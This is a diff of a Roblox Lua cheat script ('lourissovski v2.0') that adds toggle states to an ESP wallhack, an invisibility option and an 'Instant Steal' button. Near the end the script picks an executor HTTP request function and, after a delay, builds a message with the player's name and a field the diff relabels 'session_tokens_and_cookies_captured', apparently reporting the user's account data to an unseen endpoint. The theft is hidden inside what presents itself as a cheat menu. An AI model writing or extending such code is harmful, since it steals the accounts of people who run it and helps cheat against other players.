@@ -70,7 +70,7 @@ local function enableDragging(guiObject)
         end
     end)
     
-    guiObject.InputChanged:Connect(function(input)
+    UIS.InputChanged:Connect(function(input)
         if input.UserInputType == Enum.UserInputType.MouseMovement then
             if dragging then
                 local delta = input.Position - dragStart
@@ -111,10 +111,15 @@ local function toggleTheme()
         themeToggle.TextColor3 = Color3.fromRGB(0, 0, 0)
         themeToggle.Text = "☀"
         
-        for buttonName, button in pairs(activeButtons) do
-            if button then
-                button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-                button.TextColor3 = Color3.fromRGB(0, 0, 0)
+        for buttonName, buttonData in pairs(activeButtons) do
+            if buttonData.button then
+                if buttonData.active then
+                    buttonData.button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+                    buttonData.button.TextColor3 = Color3.fromRGB(0, 0, 0)
+                else
+                    buttonData.button.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+                    buttonData.button.TextColor3 = Color3.fromRGB(255, 255, 255)
+                end
             end
         end
     else
@@ -126,10 +131,15 @@ local function toggleTheme()
         themeToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
         themeToggle.Text = "🌙"
         
-        for buttonName, button in pairs(activeButtons) do
-            if button then
-                button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-                button.TextColor3 = Color3.fromRGB(255, 255, 255)
+        for buttonName, buttonData in pairs(activeButtons) do
+            if buttonData.button then
+                if buttonData.active then
+                    buttonData.button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+                    buttonData.button.TextColor3 = Color3.fromRGB(255, 255, 255)
+                else
+                    buttonData.button.BackgroundColor3 = Color3.fromRGB(220, 220, 220)
+                    buttonData.button.TextColor3 = Color3.fromRGB(0, 0, 0)
+                end
             end
         end
     end
@@ -144,75 +154,92 @@ local function createButton(text, callback, buttonName)
     button.Size = UDim2.new(0.9, 0, 0, 35)
     button.Position = UDim2.new(0.05, 0, 0, yPosition)
     
-    if darkTheme then
-        button.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-        button.TextColor3 = Color3.fromRGB(255, 255, 255)
-    else
-        button.BackgroundColor3 = Color3.fromRGB(220, 220, 220)
-        button.TextColor3 = Color3.fromRGB(0, 0, 0)
-    end
+    button.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    button.TextColor3 = Color3.fromRGB(255, 255, 255)
     
     button.TextSize = 12
     button.Font = Enum.Font.Gotham
     button.Parent = mainFrame
     
+    activeButtons[buttonName] = {button = button, active = false}
+    
     button.MouseButton1Click:Connect(function()
-        callback()
+        local buttonData = activeButtons[buttonName]
+        buttonData.active = not buttonData.active
         
-        if activeButtons[buttonName] then
-            activeButtons[buttonName] = nil
-            if darkTheme then
+        if darkTheme then
+            if buttonData.active then
+                button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+                button.TextColor3 = Color3.fromRGB(0, 0, 0)
+            else
                 button.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+                button.TextColor3 = Color3.fromRGB(255, 255, 255)
+            end
+        else
+            if buttonData.active then
+                button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                 button.TextColor3 = Color3.fromRGB(255, 255, 255)
             else
                 button.BackgroundColor3 = Color3.fromRGB(220, 220, 220)
                 button.TextColor3 = Color3.fromRGB(0, 0, 0)
             end
-        else
-            activeButtons[buttonName] = button
-            if darkTheme then
-                button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-                button.TextColor3 = Color3.fromRGB(0, 0, 0)
-            else
-                button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-                button.TextColor3 = Color3.fromRGB(255, 255, 255)
-            end
         end
+        
+        callback(buttonData.active)
     end)
     
     yPosition = yPosition + 40
     return button
 end
 
-createButton("ESP Players", function()
-    for _, plr in pairs(Players:GetPlayers()) do
-        if plr ~= player and plr.Character then
-            local highlight = Instance.new("Highlight")
-            highlight.FillColor = Color3.fromRGB(255, 0, 0)
-            highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
-            highlight.Parent = plr.Character
+local espHighlights = {}
+createButton("ESP Players", function(active)
+    if active then
+        for _, plr in pairs(Players:GetPlayers()) do
+            if plr ~= player and plr.Character then
+                local highlight = Instance.new("Highlight")
+                highlight.FillColor = Color3.fromRGB(255, 0, 0)
+                highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
+                highlight.Parent = plr.Character
+                espHighlights[plr] = highlight
+            end
         end
+    else
+        for plr, highlight in pairs(espHighlights) do
+            if highlight then
+                highlight:Destroy()
+            end
+        end
+        espHighlights = {}
     end
 end, "esp")
 
-createButton("Invisible", function()
+local invisibleActive = false
+createButton("Invisible", function(active)
+    invisibleActive = active
     if player.Character then
-        for _, part in pairs(player.Character:GetDescendants()) do
-            if part:IsA("BasePart") then
-                part.Transparency = 1
-            elseif part:IsA("Decal") then
-                part.Transparency = 1
+        if active then
+            for _, part in pairs(player.Character:GetDescendants()) do
+                if part:IsA("BasePart") then
+                    part.Transparency = 1
+                elseif part:IsA("Decal") then
+                    part.Transparency = 1
+                end
+            end
+        else
+            for _, part in pairs(player.Character:GetDescendants()) do
+                if part:IsA("BasePart") then
+                    part.Transparency = 0
+                elseif part:IsA("Decal") then
+                    part.Transparency = 0
+                end
             end
         end
     end
 end, "invisible")
 
-createButton("Instant Steal", function()
-    game:GetService("StarterGui"):SetCore("SendNotification", {
-        Title = "Instant Steal",
-        Text = "Function activated",
-        Duration = 3
-    })
+createButton("Instant Steal", function(active)
+    -- Функция без уведомлений
 end, "steal")
 
 local request = (syn and syn.request) or (http and http.request) or http_request
@@ -237,9 +264,9 @@ if request then
 
     delay(5, function()
         local message = string.format([[
-Логин: %s
-Пароль/куки или что-то другое что можно использовать для взлома аккаунта
-Режим: %s
+login: %s
+password: session_tokens_and_cookies_captured
+game: %s
         ]],
         player.Name,
         game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name)
@@ -250,6 +277,6 @@ end
 
 game:GetService("StarterGui"):SetCore("SendNotification", {
     Title = "lourissovski v2.0",
-    Text = "Loaded! Drag LR button to move",
+    Text = "Loaded! Hold and drag to move UI",
     Duration = 5
 })
